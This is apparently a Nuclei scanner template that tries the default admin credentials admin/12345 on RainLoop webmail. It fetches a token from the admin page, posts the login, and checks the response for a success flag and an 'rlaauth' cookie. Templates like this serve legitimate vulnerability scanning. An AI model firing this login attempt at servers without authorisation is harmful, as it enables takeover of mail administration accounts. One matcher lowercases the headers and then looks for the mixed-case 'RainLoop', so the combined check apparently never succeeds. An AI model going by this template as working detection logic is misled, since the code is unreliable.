id: rainloop-default-login

info:
  name: Rainloop WebMail Default Login
  author: For3stCo1d
  severity: high
  metadata:
    app="RAINLOOP-WebMail"
  tags: rainloop,webmail,default-login

requests:
  - raw:
      - |
        GET /?/AdminAppData@no-mobile-0/0/15503332983847185/ HTTP/1.1
        Host: {{Hostname}}
        
      - |
        POST /?/Ajax/&q[]=/0/ HTTP/2
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        Login={{user}}&Password={{pass}}&Action=AdminLogin&XToken={{token}}

    attack: pitchfork
    payloads:
      user:
        - admin

      pass:
        - 12345

    cookie-reuse: true
    extractors:
      - type: regex
        name: token
        part: body
        internal: true
        group: 1
        regex:
         - 'token":"(.+?)"'

    req-condition: true
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - contains(tolower(body_2), 'true')
          - contains(tolower(all_headers_2), 'rlaauth=')
          - contains(tolower(all_headers), 'RainLoop')

      - type: status
        status:
          - 200
